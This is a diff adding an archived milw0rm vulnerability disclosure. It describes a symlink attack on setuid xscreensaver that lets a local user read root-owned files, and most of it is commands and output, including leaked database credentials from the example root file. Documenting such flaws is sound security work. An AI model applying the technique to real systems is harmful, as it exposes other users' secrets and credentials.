@@ -1,0 +1,43 @@
+xscreensaver local arbitrary file disclosure | symlink attack
+
+The �xscreensaver� program distributed normally with Xorg can be abused
+to disclose local files owned by other users (also of the root account).
+Xscreensaver has the setuid bit on by default (Example: Opensolaris)
+The xscreensaver program uses the file ~/.xscreensaver to read configuration
+options from. If this file is a symlink to another file then this file is parsed
+and output is shown on the display. It has to be noted that during the parsing
+of the file it may be possible that not the full file contents will be shown.
+
+Here is an example attack scenario on an Opensolaris default install (with Xorg):
+
+kcope@opensolaris:~# ls -la /root/db.php && cat /root/db.php
+-rw-------   1 root     root          61 Dez 27 17:59 /root/db.php
+$db_user = "root";
+$db_pass = "secret";
+
+kcope@opensolaris:~$ ln -s /root/db.php ~/.xscreensaver
+kcope@opensolaris:~$ ls -la ~/.xscreensaver
+lrwxrwxrwx 1 kcope staff 12 1986-12-27 18:01 /export/home/kcope/.xscreensaver -> /root/db.php
+
+kcope@opensolaris:~$ xscreensaver -verbose
+xscreensaver 5.01, copyright (c) 1991-2006 by Jamie Zawinski <jwz@jwz.org>.
+xscreensaver: running as kcope/staff (101/10); effectively root/staff (0/10)
+xscreensaver: in process 2186.
+xscreensaver: /export/home/kcope/.xscreensaver:1: unparsable line: $db_user = "root";
+xscreensaver: /export/home/kcope/.xscreensaver:2: unparsable line: $db_pass = "secret";
+xscreensaver: 18:02:26: running /usr/X11/lib/xscreensaver/bin/xscreensaver-gl-helper: No such file or directory
+xscreensaver: 18:02:26: /usr/X11/lib/xscreensaver/bin/xscreensaver-gl-helper did not report a GL visual!
+.................................
+.................................
+.................................
+
+
+As one can see in the above output the contents of the root owned file 
+db.php is shown in the
+xscreensaver output.
+
+Best Regards,
+
+Nikolaos Rangos
+
+# milw0rm.com [2009-07-09]
